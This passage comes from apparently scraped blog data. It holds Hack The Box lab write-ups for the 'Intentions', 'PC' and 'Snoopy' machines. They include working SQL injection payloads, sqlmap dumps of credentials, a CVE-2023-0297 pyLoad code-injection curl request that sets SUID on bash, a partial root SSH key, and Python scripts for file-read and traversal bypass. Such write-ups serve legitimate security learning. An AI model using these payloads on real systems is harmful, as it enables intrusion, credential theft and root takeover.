-s {hash_value} -p -l {hash_length}\u0026#34; # os.system(command) command = f\u0026#34;/opt/scanner/scanner -c {fileName} -s {hash_value} -p -l {hash_length}\u0026#34; process = subprocess.run(command, shell=True, capture_output=True, text=True) scanner_output = process.stdout scanner_err = process.stderr.strip() if scanner_err != \u0026#34;\u0026#34;: print(f\u0026#34;Error: {scanner_err}\u0026#34;) sys.exit() # print(scanner_output) hash = scanner_output.strip().split(\u0026#34; \u0026#34;)[4] # print(hash) return hash def gen_hash(text: str): hashed_text = hashlib.md5(text.encode()).hexdigest() return hashed_text def correct_char(temp_hash: str): for char in charset: data = decoded_text + char new_hash = gen_hash(data) if temp_hash == new_hash: return char return None fileName = sys.argv[1] if len(sys.argv) != 2: print(\u0026#34;FileName needed\u0026#34;) sys.exit() charset = string.printable decoded_text = \u0026#34;\u0026#34; # hash_value = sys.argv[2] # hash_length = sys.argv[3] for i in count(1): try: test_hash = grab_hash(fileName, i) test_char = correct_char(test_hash) if test_char is None: break decoded_text += test_char except Exception as e: print(f\u0026#34;An error occurred: {e}\u0026#34;) sys.exit(1) print(f\u0026#34;File content: \\n{decoded_text}\u0026#34;) Testing this with the user flag is successful, meaning the script works!\n(remote) greg@intentions:/tmp$ cat ~/user.txt c317b23bf4affb80fd3d93b813dcaaf1 (remote) greg@intentions:/tmp$ python3 gimme_root.py /home/greg/user.txt File content: c317b23bf4affb80fd3d93b813dcaaf1 Similarly, the root flag can be obtained using a similar approach. By running a loop and sequentially matching hash values, the flag\u0026rsquo;s characters can be decoded and the root flag extracted.\n(remote) greg@intentions:/tmp$ python3 gimme_root.py /root/root.txt File content: de01b4e5992cf6a18283887bdc30b11d Retrieved the SSH private key using the same script.\n(remote) greg@intentions:/tmp$ python3 gimme_root.py /root/.ssh/id_rsa File content: -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn ...snip... The SSH key can be used to log in as the root user via SSH.\n\u0026gt; pc root@intentions.htb -i id_rsa.root [11:32:58] Welcome to pwncat 🐈! __main__.py:164 [11:33:00] intentions.htb:22: registered new host w/ db manager.py:957 (local) pwncat$ (remote) root@intentions:/root# id uid=0(root) gid=0(root) groups=0(root) Pwned!!\nReferences # SQL injection (second order) - PortSwigger SQLMap Tamper Scripts (SQL Injection and WAF bypass) - Starter Zone - Bugcrowd Forum Second Order SQLI: Automating with sqlmap · Jorge Lajara Website Bypassing Web Application Firewalls with SQLMap Tamper Scripts SQLMap Tamper Scripts (SQL Injection and WAF bypass) Tips | by Dragon Security | Medium Exploiting Arbitrary Object Instantiations in PHP without Custom Classes – PT SWARM Exploiting Linux Capabilities – Part 2 capabilities(7) - Linux manual page ","date":"17 October 2023","permalink":"/blog/htb-intentions/","section":"Blog Posts","summary":"Intentions is a Hard linux box that involving a second-order SQL injection vulnerability which enables the extraction of admin password hashes. Leveraging a different API endpoint, these hashes can be used to access the admin page. Within the admin page, there\u0026rsquo;s a feature to modify images, which relies on Imagick. This opens up an opportunity to exploit arbitrary object instantiation, ultimately allowing to write a PHP webshell and establishing a foothold. After gaining access to the system, credentials are found in an old Git commit in the website\u0026rsquo;s repository. These credentials are reused for SSH access, allowing access to a user capable of running a copyright_scanner application, which has the CAP_DAC_READ_SEARCH capability. This capability can be exploited to read files as the root user.","title":"HTB Intentions"},{"content":"","date":null,"permalink":"/tags/php-arbitrary-object-instantiation/","section":"Tags","summary":"","title":"PHP Arbitrary Object Instantiation"},{"content":"","date":null,"permalink":"/tags/second-order-sqli/","section":"Tags","summary":"","title":"Second-Order-SQLi"},{"content":"","date":null,"permalink":"/tags/sqli/","section":"Tags","summary":"","title":"SQLi"},{"content":"","date":null,"permalink":"/tags/cve-2023-0297/","section":"Tags","summary":"","title":"CVE-2023-0297"},{"content":"","date":null,"permalink":"/tags/grpc/","section":"Tags","summary":"","title":"GRPC"},{"content":" PC is an easy Linux box with only one open port, aside from SSH, which hosts a gRPC application. One of the RPC services within this application has a vulnerability that can be exploited for SQL injection, leading to the disclosure of credentials for the user \u0026lsquo;sau\u0026rsquo;. These credentials are also reused for SSH access, granting a shell. Further enumeration reveals an internal server running on port 8000, powered by Cheroot version 8.6.0. This specific version of Cheroot is susceptible to CVE-2023-0297, enabling the execution of commands as the user running Cheroot. By leveraging this vulnerability, it is possible to escalate privileges to root.\nEnumeration # Open Ports #nmap -p22,50051 -sV -sC -T4 -Pn -oA 10.10.11.214 10.10.11.214 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 14:18 EDT Nmap scan report for 10.10.11.214 Host is up (0.25s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 91bf44edea1e3224301f532cea71e5ef (RSA) | 256 8486a6e204abdff71d456ccf395809de (ECDSA) |_ 256 1aa89572515e8e3cf180f542fd0a281c (ED25519) 50051/tcp open unknown port 50051, gRPC #Connecting to port 50051 using netcat doesn\u0026rsquo;t return anything significant. The headers are compressed and returned in binary format. Additionally, the timeout suggests it expects an HTTP/2 request, indicating it might be a gRPC service, given the default port.\n\u0026gt; nc -v 10.129.206.168 50051 Ncat: Version 7.93 ( https://nmap.org/ncat ) Ncat: Connected to 10.129.206.168:50051. \u0018\u0004\u0004?��\u0005?��\u0006 �\u0003\u0001?@\u0002Did not receive HTTP/2 settings before handshake timeout gRPC is a Remote Procedure Call framework that relies on HTTP/2 and supports bi-directional communication, unlike REST which only a supports request-response. There are many tools like grpcurl or grpc-client-cli, but I ended up using evans since it has a interactive repl option. Additionally, with gRPC reflections enabled, it can list available services and request types.\n\u0026gt; evans --reflection --host 10.129.206.168 --verbose repl evans: load global config from /home/abraxas/.config/evans ...snip... ...snip... ______ | ____| | |__ __ __ __ _ _ __ ___ | __| \\ \\ / / / _. | | |_ \\ / __| | |____ \\ V / | (_| | | | | | \\__ \\ |______| \\_/ \\__,_| |_| |_| |___/ more expressive universal gRPC client SimpleApp@10.129.206.168:50051\u0026gt; show package +-------------------------+ | PACKAGE | +-------------------------+ | | | grpc.reflection.v1alpha | +-------------------------+ SimpleApp@10.129.206.168:50051\u0026gt; show service +-----------+--------------+---------------------+----------------------+ | SERVICE | RPC | REQUEST TYPE | RESPONSE TYPE | +-----------+--------------+---------------------+----------------------+ | SimpleApp | LoginUser | LoginUserRequest | LoginUserResponse | | SimpleApp | RegisterUser | RegisterUserRequest | RegisterUserResponse | | SimpleApp | getInfo | getInfoRequest | getInfoResponse | +-----------+--------------+---------------------+----------------------+ Setting the service to be used as SimpleApp (service SimpleApp), I can call a listed RPC. The getInfo request type requires an authorization header called token to be set.\nSimpleApp@10.129.206.168:50051\u0026gt; call getInfo id (TYPE_STRING) =\u0026gt; 123 evans: map[grpc-client:[evans]] evans: request: { \u0026#34;id\u0026#34;: \u0026#34;123\u0026#34; } { \u0026#34;message\u0026#34;: \u0026#34;Authorization Error.Missing \u0026#39;token\u0026#39; header\u0026#34; } The RegisterUser RPC allows to register an user, and I can login using LoginUser. However, LoginUser doesn\u0026rsquo;t not show the response headers, these can be shown with the --enrich option.\nSimpleApp@10.129.206.168:50051\u0026gt; call RegisterUser username (TYPE_STRING) =\u0026gt; abraxas password (TYPE_STRING) =\u0026gt; abraxas evans: map[grpc-client:[evans]] evans: request: { \u0026#34;username\u0026#34;: \u0026#34;abraxas\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;abraxas\u0026#34; } { \u0026#34;message\u0026#34;: \u0026#34;Account created for user abraxas!\u0026#34; } SimpleApp@10.129.206.168:50051\u0026gt; call LoginUser --enrich username (TYPE_STRING) =\u0026gt; abraxas password (TYPE_STRING) =\u0026gt; abraxas evans: map[grpc-client:[evans]] evans: request: { \u0026#34;username\u0026#34;: \u0026#34;abraxas\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;abraxas\u0026#34; } content-type: application/grpc grpc-accept-encoding: identity, deflate, gzip { \u0026#34;message\u0026#34;: \u0026#34;Your id is 139.\u0026#34; } token: b\u0026#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWJyYXhhcyIsImV4cCI6MTY5NDI5MDI2Mn0.Jk4mRPhFr07sdAWF80Q4i42T3NOuGr2V3WuEO39Hm2s\u0026#39; code: OK number: 0 message: \u0026#34;\u0026#34; The getInfo RPC requires the token header to be set, and an id parameter, both of which are found in the response from the Login RPC\nSimpleApp@10.129.206.168:50051\u0026gt; header token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWJyYXhhcyIsImV4cCI6MTY5NDI5MDI2Mn0.Jk4mRPhFr07sdAWF80Q4i42T3NOuGr2V3WuEO39Hm2s SimpleApp@10.129.206.168:50051\u0026gt; call getInfo id (TYPE_STRING) =\u0026gt; 139 evans: map[grpc-client:[evans] token:[eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWJyYXhhcyIsImV4cCI6MTY5NDI5MDI2Mn0.Jk4mRPhFr07sdAWF80Q4i42T3NOuGr2V3WuEO39Hm2s]] evans: request: { \u0026#34;id\u0026#34;: \u0026#34;139\u0026#34; } { \u0026#34;message\u0026#34;: \u0026#34;Will update soon.\u0026#34; } The response doesn\u0026rsquo;t give any new information, but it does give a new input field.\nFoothold # In order to understand how the request is being sent, need to proxy the getInfo RPC through burp. Since I couldn\u0026rsquo;t proxy evan, switched to a different tool called grpcui. This opens an WebUI on the browser, which can in turn can easily be proxied through burp\n\u0026gt; grpcui -use-reflection -plaintext 10.129.68.2:50051 gRPC Web UI available at http://127.0.0.1:53937/ Using the same process as before, can login via the LoginUser RPC.\nInvoking the getInfo RPC using the token header metadata and id from LoginUser.\nUnion based SQL injection #getInfo RPC request captured in burp suite using the id and token header. The id input field is controlled by the user, so it could be susceptible to injection vulnerabilities.\nSQL injected on the id parameter can be confirmed using the payload 514 or true --.\nAdditionally, I can exploit SQL Union injection on the id field, since 11 is reflected in the response message.\nFurther utilizing the union injection, can confirm the backend database as SQlite version 3.31.1\nDumping all tables in the database from the sqlite_master table.\n514 union select group_concat(tbl_name) FROM sqlite_master WHERE type=\u0026#39;table\u0026#39; and tbl_name NOT like \u0026#39;sqlite_%\u0026#39; -- The column names from the accounts table can be dumped using the payload,\n514 union SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info(\u0026#39;accounts\u0026#39;); -- Using the group_concat() can dump all usernames from the accounts table\n514 union select group_concat(username) from accounts -- Similarly, the passwords can be dumped using the payload, 514 union select group_concat(password) from accounts --\nSQLi using sqlmap #The sqli exploitation can also be automated using sqlmap.\nsqlmap -r sqli.req --risk 3 --level 3 -p id --dbms=SQlite --batch --tables [15:53:47] [INFO] the back-end DBMS is SQLite back-end DBMS: SQLite [15:53:47] [INFO] fetching tables for database: \u0026#39;SQLite_masterdb\u0026#39; \u0026lt;current\u0026gt; [2 tables] +----------+ | accounts | | messages | +----------+ Similarly, the accounts tables can be dumped by appending -T accounts --dump to the previous command. The accounts table contains the password for the user, sau.\n\u0026gt; sqlmap -r sqli.req --risk 3 --level 3 -p id --batch -T accounts --dump [15:54:27] [INFO] fetching entries for table \u0026#39;accounts\u0026#39; Database: \u0026lt;current\u0026gt; Table: accounts [2 entries] +------------------------+----------+ | password | username | +------------------------+----------+ | admin | admin | | HereIsYourPassWord1431 | sau | +------------------------+----------+ Nothing relevant in the messages table.\n[15:55:10] [INFO] fetching entries for table \u0026#39;messages\u0026#39; Database: \u0026lt;current\u0026gt; Table: messages [1 entry] +----+----------------------------------------------+----------+ | id | message | username | +----+----------------------------------------------+----------+ | 1 | The admin is working hard to fix the issues. | admin | +----+----------------------------------------------+----------+ Shell as sau #The newly acquired credentials for sau also work on SSH.\n\u0026gt; pc sau:HereIsYourPassWord1431@10.10.11.214 [15:56:02] Welcome to pwncat 🐈! [15:56:05] 10.10.11.214:22: registered new host w/ db (local) pwncat$ (remote) sau@pc:/home/sau$ id uid=1001(sau) gid=1001(sau) groups=1001(sau) Privilege Escalation to root # Found the user flag in sau\u0026rsquo;s home directory.\n(remote) sau@pc:/home/sau$ ls -al user.txt -rw-r----- 1 root sau 33 May 27 18:25 user.txt Unfortunately, sau does not have any sudo privileges.\n(remote) sau@pc:/home/sau$ sudo -l [sudo] password for sau: Sorry, user sau may not run sudo on localhost. Looking for open ports in an attempt to search for new services on the machine, found port 8000 listening only on localhost.\n(remote) sau@pc:/home/sau$ ss -antlp State Recv-Q Send-Q Local Address:Port Peer Address:Port Process LISTEN 0 5 127.0.0.1:8000 0.0.0.0:* LISTEN 0 128 0.0.0.0:9666 0.0.0.0:* LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* LISTEN 0 128 0.0.0.0:22 0.0.0.0:* LISTEN 0 4096 *:50051 *:* LISTEN 0 128 [::]:22 [::]:* It seems the service running on port 8000 is a pure python HTTP sever powered by Cheroot version 8.6.0 and used by pyCherry. Additionally the title of the page seems to be pyLoad.\n(remote) sau@pc:/home/sau$ curl -i 127.0.0.1:8000 -L HTTP/1.1 302 FOUND Content-Type: text/html; charset=utf-8 Content-Length: 275 Location: /login?next=http%3A%2F%2F127.0.0.1%3A8000%2F Vary: Accept-Encoding Date: Sun, 10 Sep 2023 19:56:52 GMT Server: Cheroot/8.6.0 HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8 Content-Length: 13500 Vary: Accept-Encoding Date: Sun, 10 Sep 2023 19:56:52 GMT Server: Cheroot/8.6.0 ...snip... ...snip... \u0026lt;title\u0026gt;Login - pyLoad \u0026lt;/title\u0026gt; ...snip... Searching for running processes named pyload, found a python script.\n(remote) sau@pc:/home/sau$ ps aux | grep [p]yload root 1043 0.0 2.0 1231064 80760 ? Ssl 18:24 0:05 /usr/bin/python3 /usr/local/bin/pyload (remote) sau@pc:/home/sau$ file /usr/local/bin/pyload /usr/local/bin/pyload: Python script, ASCII text executable (remote) sau@pc:/home/sau$ cat /usr/local/bin/pyload #!/usr/bin/python3 # -*- coding: utf-8 -*- import re import sys from pyload.__main__ import main if __name__ == \u0026#39;__main__\u0026#39;: sys.argv[0] = re.sub(r\u0026#39;(-script\\.pyw|\\.exe)?$\u0026#39;, \u0026#39;\u0026#39;, sys.argv[0]) sys.exit(main()) Port forwarding the port 8000, using the SSH connection, 127.0.0.1:8000 redirects to a pyload page\nssh\u0026gt; -L 8000:127.0.0.1:8000 Searching for exploits for Cheroot version 8.6.0 and pyLoad found CVE-2023-0297 and the corresponding disclosure.\npyLoad versions prior to 0.5.0b3.dev31 are vulnerable to Python code injection due to the pyimport functionality exposed through the js2py library. An unauthenticated attacker can issue a crafted POST request to the flash/addcrypted2 endpoint to leverage this for code execution. pyLoad by default runs two services, the primary of which is on port 8000 and can not be used by external hosts. A secondary “Click ‘N’ Load” service runs on port 9666 and can be used remotely without authentication.\nWhen testing this particular instance of Cheroot, it returns a 500 with a response, Could not decrypt key, meaning its vulnerable. Additionally, it created the said file owned by root, which means I can execute commands as root by exploiting CVE-2023-0297.\n(remote) sau@pc:/home/sau$ curl -i -s -k -X POST \\ \u0026gt; --data-binary $\u0026#39;jk=pyimport%20os;os.system(\\\u0026#34;touch%20/tmp/pwnd_abraxas\\\u0026#34;);f=function%20f2(){};\u0026amp;package=xxx\u0026amp;crypted=AAAA\u0026amp;\u0026amp;passwords=aaaa\u0026#39; \\ \u0026gt; http://127.0.0.1:8000/flash/addcrypted2 HTTP/1.1 500 INTERNAL SERVER ERROR Content-Type: text/html; charset=utf-8 Content-Length: 21 Access-Control-Max-Age: 1800 Access-Control-Allow-Origin: * Access-Control-Allow-Methods: OPTIONS, GET, POST Vary: Accept-Encoding Date: Sun, 10 Sep 2023 20:11:03 GMT Server: Cheroot/8.6.0 Could not decrypt key (remote) sau@pc:/home/sau$ ls -la /tmp/pwnd_abraxas -rw-r--r-- 1 root root 0 Sep 10 20:11 /tmp/pwnd_abraxas Created a bash script which set the SUID bit on /bin/bash.\n(remote) sau@pc:/home/sau$ echo \u0026#39;chmod 6777 /bin/bash\u0026#39; \u0026gt; /tmp/escalate.sh (remote) sau@pc:/home/sau$ curl -i -s -k -X POST \\ \u0026gt; --data-binary $\u0026#39;jk=pyimport%20os;os.system(\\\u0026#34;bash%20/tmp/escalate.sh\\\u0026#34;);f=function%20f2(){};\u0026amp;package=xxx\u0026amp;crypted=AAAA\u0026amp;\u0026amp;passwords=aaaa\u0026#39; \\ \u0026gt; http://127.0.0.1:8000/flash/addcrypted2 HTTP/1.1 500 INTERNAL SERVER ERROR Content-Type: text/html; charset=utf-8 Content-Length: 21 Access-Control-Max-Age: 1800 Access-Control-Allow-Origin: * Access-Control-Allow-Methods: OPTIONS, GET, POST Vary: Accept-Encoding Date: Sun, 10 Sep 2023 20:11:03 GMT Server: Cheroot/8.6.0 Could not decrypt key With the SUID bit set on the bash binary, it can be run in privileged mode to get effective root privileges.\n(remote) sau@pc:/home/sau$ ls -la /bin/bash -rwsrwsrwx 1 root root 1183448 Apr 18 2022 /bin/bash (remote) sau@pc:/home/sau$ bash -p (remote) root@pc:/home/sau# id uid=1001(sau) gid=1001(sau) euid=0(root) egid=0(root) groups=0(root),1001(sau) (remote) root@pc:/home/sau# ls -la /root/root.txt -rw-r----- 1 root root 33 Sep 10 19:49 /root/root.txt There\u0026rsquo;s also a auto exploit script available on GitHub.\nPwned!!\nRelated Links # https://github.com/ktr0731/evans https://github.com/fullstorydev/grpcui CVE-2023-0297 | AttackerKB bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad: CVE-2023-0297: The Story of Finding Pre-auth RCE in pyLoad JacobEbben/CVE-2023-0297: Unauthenticated Remote Code Execution in PyLoad \u0026lt;0.5.0b3.dev31 ","date":"8 October 2023","permalink":"/blog/htb-pc/","section":"Blog Posts","summary":"PC is an easy Linux box with only one open port, aside from SSH, which hosts a gRPC application.","title":"HTB PC"},{"content":"","date":null,"permalink":"/tags/sqlite/","section":"Tags","summary":"","title":"Sqlite"},{"content":"","date":null,"permalink":"/tags/bind/","section":"Tags","summary":"","title":"BIND"},{"content":"","date":null,"permalink":"/tags/clamav/","section":"Tags","summary":"","title":"ClamAV"},{"content":"","date":null,"permalink":"/tags/cve-2023-20052/","section":"Tags","summary":"","title":"CVE-2023-20052"},{"content":"","date":null,"permalink":"/tags/cve-2023-23946/","section":"Tags","summary":"","title":"CVE-2023-23946"},{"content":"","date":null,"permalink":"/tags/dns/","section":"Tags","summary":"","title":"Dns"},{"content":"","date":null,"permalink":"/tags/dns-poisoning/","section":"Tags","summary":"","title":"Dns-Poisoning"},{"content":"","date":null,"permalink":"/tags/git-apply/","section":"Tags","summary":"","title":"Git-Apply"},{"content":"Snoopy HTB #Overview # Snoopy is a Hard Linux box where I start by exploiting a file read vulnerability on the primary site, which allowed me to access BIND DNS config files and the rndc key. With this access, I could update DNS records for the mail server. With control over the mail server, I reset a user\u0026rsquo;s password to access a Mattermost site. During server provisioning, I set up a honeypot to capture SSH credentials. Once inside the server, I exploited a Git apply command vulnerability, enabling me to write to files outside the working copy. Finally, I leveraged an XXE vulnerability in ClamAV\u0026rsquo;s DMG parser to read root\u0026rsquo;s SSH keys.\nEnumeration # Open Ports #Found three open ports with nmap,\nport 22 → OpenSSH port 53 → BIND DNS server port 80 → Nginx WebServer # Nmap 7.93 scan initiated Thu Jul 20 06:40:44 2023 as: nmap -p22,53,80 -sV -sC -T4 -v -Pn -oA 10.10.11.212/10.10.11.212 10.10.11.212 Nmap scan report for 10.10.11.212 Host is up (0.057s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 ee6bcec5b6e3fa1b97c03d5fe3f1a16e (ECDSA) |_ 256 545941e1719a1a879c1e995059bfe5ba (ED25519) 53/tcp open domain ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: SnoopySec Bootstrap Template - Index | http-methods: |_ Supported Methods: GET HEAD |_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ❯ http -ph snoopy.htb HTTP/1.1 200 OK Connection: keep-alive Content-Encoding: gzip Content-Type: text/html Date: Fri, 22 Sep 2023 08:17:59 GMT ETag: W/\u0026#34;64417cc6-5b7a\u0026#34; Last-Modified: Thu, 20 Apr 2023 17:56:22 GMT Server: nginx/1.18.0 (Ubuntu) Transfer-Encoding: chunked port 80 - HTTP #Site headers don\u0026rsquo;t provide any new information about the index page. The index page itself contains links to a domain, snoopy.htb, and an email address, info@snoopy.htb, in the Contact Us footer. Adding the domain to /etc/hosts.\nIndex Page The press release can be downloaded via the URL http://snoopy.htb/download?file=announcement.pdf. As announcement.pdf is used as a parameter, this could potentially be vulnerable to LFI or some kind of file read.\nThe team page has a few email, which could potentially be usernames,\ncschultz@snoopy.htb sbrown@snoopy.htb hangel@snoopy.htb lpelt@snoopy.htb The contact page includes a banner that informs users about the current unavailability of the mail server at mail.snoopy.htb due to DNS issues.\nMailserver DNS issue \u0026gt; dig +noall +nocmd +answer mx @10.10.11.212 mail.snoopy.htb \u0026gt; dig +noall +nocmd +answer any @10.10.11.212 mail.snoopy.htb PHP Tech stack On the contact page, there is a form that cannot be submitted successfully. When attempting to send the form, it sends a request to /forms/contact.php, but unfortunately, it returns an error message: \u0026ldquo;Error: Unable to load the \u0026lsquo;PHP Email Form\u0026rsquo; Library!\u0026rdquo; This suggests that the website is PHP-based. Interestingly, when accessing index.php, it returns a 404 error, which is strange.\n❯ http -ph snoopy.htb/index.php HTTP/1.1 404 Not Found ...snip... ❯ http -ph snoopy.htb/index.html HTTP/1.1 200 OK ...snip... port 53 - DNS #Given that TCP is used for DNS, it\u0026rsquo;s probable that it\u0026rsquo;s also used for zone transfers. A DNS zone transfer is a method for replicating DNS records across a group of servers. By initiating a zone transfer request, I can obtain a copy of the zone, potentially revealing other virtual hosts within it. Additionally, because this process typically doesn\u0026rsquo;t necessitate authentication and I have a domain, this can be easily accomplished using the dig command.\n\u0026gt; dig +noall +nocmd +answer axfr @10.10.11.212 snoopy.htb snoopy.htb. 86400 IN SOA ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400 snoopy.htb. 86400 IN NS ns1.snoopy.htb. snoopy.htb. 86400 IN NS ns2.snoopy.htb. mattermost.snoopy.htb. 86400 IN A 172.18.0.3 mm.snoopy.htb. 86400 IN A 127.0.0.1 ns1.snoopy.htb. 86400 IN A 10.0.50.10 ns2.snoopy.htb. 86400 IN A 10.0.51.10 postgres.snoopy.htb. 86400 IN A 172.18.0.2 provisions.snoopy.htb. 86400 IN A 172.18.0.4 www.snoopy.htb. 86400 IN A 127.0.0.1 snoopy.htb. 86400 IN SOA ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400 The presence of IP addresses in the 172.18.x.x range suggests that the associated applications may be containerized. Unfortunately, the only domains that resolve to new sites are:\nsnoopy.htb mm.snoopy.htb Fuzzing for other subdomains using wfuzz, didn\u0026rsquo;t find anything other than the mm vhost. Adding it to /etc/hosts.\n******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://snoopy.htb/ Total requests: 4989 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000582: 200 0 L 141 W 3132 Ch \u0026#34;mm\u0026#34; port 80 - mm.snoopy.htb #This vhost seems to be a Mattermost instance.\nMattermost is an open-source, self-hostable online chat service with file sharing, search, and integrations. It is designed as an internal chat for organisations and companies, and mostly markets itself as an open-source alternative to Slack and Microsoft Teams.\n\u0026gt; http mm.snoopy.htb | html2text ## Cannot connect to Mattermost * * * We\u0026#39;re having trouble connecting to Mattermost. If refreshing this page (Ctrl+R or Command+R) does not work, please verify that your computer is connected to the internet. To use Mattermost, please enable JavaScript. This will eventually lead to a Mattermost login page, which has two links: Don\u0026rsquo;t have an account and Forgot your password?.\nThe Don\u0026rsquo;t have an account link just instructs users to contact the workspace admin and check their inbox for an invitation. The Forgot your password link offers the functionality to reset a password based on the entered email ID. However, it appears that the reset process involves sending an email to the provided email address, which I don\u0026rsquo;t have access to.\nUnfortunately, using the CEO\u0026rsquo;s email instead returns an 500 error\n{ \u0026#34;id\u0026#34;:\u0026#34;api.user.send_password_reset.send.app_error\u0026#34;, \u0026#34;message\u0026#34;:\u0026#34;Failed to send password reset email successfully.\u0026#34;, \u0026#34;detailed_error\u0026#34;:\u0026#34;\u0026#34;, \u0026#34;request_id\u0026#34;:\u0026#34;4hqhjmk9qins3rq978yobc3w4w\u0026#34;, \u0026#34;status_code\u0026#34;:500 } Password reset error The fact that there are no MX records for the domains supports the banner\u0026rsquo;s claim that the mail server is down due to DNS issues. This could explain the email functionality problems.\n\u0026gt; dig +nocmd +answer mx snoopy.htb @10.10.11.212 \u0026gt; dig +nocmd +answer mx mm.snoopy.htb @10.10.11.212 Initial Foothold # File read exploit #Revisiting the download endpoint, the press release archive doesn\u0026rsquo;t contain significant information. However, the download endpoint for the press release is intriguing as it directly includes the parameter file\u0026rsquo;s content in a ZIP format.\n\u0026gt; unzip -l press_release.zip Archive: press_release.zip Length Date Time Name --------- ---------- ----- ---- 30732 2023-04-20 17:52 announcement.pdf 11425609 2023-04-20 17:52 snoopysec_marketing.mp4 --------- ------- 11456341 2 files Press release download request Standard directory traversal methods are not effective, but it\u0026rsquo;s possible to bypass this by using ....// instead of ../. Furthermore, based on the Content-Disposition filename field in the response, it appears that the response contains binary data in zip format.\nFile read exploit The zip file contains the /etc/hostname file which is evident by extracting the contents of the resulting zip archive.\n❯ curl -s http://snoopy.htb/download\\?file\\=....//....//...//....//....//etc/hostname --output lfi.zip ❯ unzip -l lfi.zip Archive: lfi.zip warning [lfi.zip]: 224 extra bytes at beginning or within zipfile (attempting to process anyway) Length Date Time Name --------- ---------- ----- ---- 11 2023-02-24 06:05 press_package/./etc/hostname --------- ------- 11 1 file ❯ unzip lfi.zip Archive: lfi.zip warning [lfi.zip]: 224 extra bytes at beginning or within zipfile (attempting to process anyway) extracting: press_package/etc/hostname ❯ cat press_package/etc/hostname snoopy.htb To simplify the process, I wrote a Python script to automate these steps and achieve the desired outcome.\n#!/usr/bin/env python import re import sys from zipfile import ZipFile import requests import urllib3 fileName = sys.argv[1] zipName = \u0026#34;file_read_download.zip\u0026#34; username = \u0026#34;\u0026#34; password = \u0026#34;\u0026#34; url = \u0026#34;http://snoopy.htb/download\u0026#34; proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} params = {\u0026#34;file\u0026#34;: f\u0026#34;....//....//....//....//{fileName}\u0026#34;} def extract_data(zipName): with ZipFile(zipName, \u0026#34;r\u0026#34;) as zipObj: zipObj.extractall(\u0026#34;unzipped_content\u0026#34;) unzipped_file = zipObj.namelist()[0] with open(f\u0026#34;unzipped_content/{unzipped_file}\u0026#34;, \u0026#34;r\u0026#34;) as file: content = file.read() print(content) try: session = requests.Session() response = session.get(url=url, params=params, proxies=proxies, verify=False) # print(response.text) if not response.content: raise Exception(\u0026#34;File doesn\u0026#39;t exist\u0026#34;) # streaming download with open(zipName, \u0026#34;wb\u0026#34;) as file: for chunk in response.iter_content(chunk_size=1024): if chunk: file.write(chunk) extract_data(zipName) except Exception as e: print(f\u0026#34;Exception raised: {e}\u0026#34;) \u0026gt; python zip_file_read.py /etc/hostname snoopy.htb Now that I can read /etc/passwd, found a few users with login shells.\n\u0026gt; python zip_file_read.py /etc/passwd | grep sh$ root❌0:0:root:/root:/bin/bash cbrown❌1000:1000:Charlie Brown:/home/cbrown:/bin/bash sbrown❌1001:1001:Sally Brown:/home/sbrown:/bin/bash lpelt❌1003:1004::/home/lpelt:/bin/bash cschultz❌1004:1005:Charles Schultz:/home/cschultz:/bin/bash vgray❌1005:1006:Violet Gray:/home/vgray:/bin/bash Looking at /proc/self/* files confirms that the website is PHP based.\n\u0026gt; python zip_file_read.py /proc/self/cmdline php-fpm: pool www Using the path for the current working directory, /proc/self/cwd/ can be used to query the source code of the website.\nindex.html\n\u0026gt; python zip_file_read.py /proc/self/cwd/index.html ...snip... \u0026lt;!-- ======================================================= * Template Name: SnoopySec * Updated: Mar 10 2023 with Bootstrap v5.2.3 * Template URL: https://bootstrapmade.com/SnoopySec-bootstrap-business-template/ * Author: BootstrapMade.com * License: https://bootstrapmade.com/license/ ======================================================== --\u0026gt; ...snip... This attempts to create a ZIP archive from files in the press_package/ directory. It replaces the ../ sequence from the file parameter which is why ....// bypasses the sanitization. The resultant file is then added to the archive.\n\u0026gt; python zip_file_read.py /proc/self/cwd/download.html Exception raised: File doesn\u0026#39;t exist \u0026gt; python zip_file_read.py /proc/self/cwd/download.php \u0026lt;?php $file = $_GET[\u0026#39;file\u0026#39;]; $dir = \u0026#39;press_package/\u0026#39;; $archive = tempnam(sys_get_temp_dir(), \u0026#39;archive\u0026#39;); $zip = new ZipArchive(); $zip-\u0026gt;open($archive, ZipArchive::CREATE); if (isset($file)) { $content = preg_replace(\u0026#39;/\\.\\.\\//\u0026#39;, \u0026#39;\u0026#39;, $file); $filecontent = $dir . $content; if (file_exists($filecontent)) { if ($filecontent !== \u0026#39;.\u0026#39; 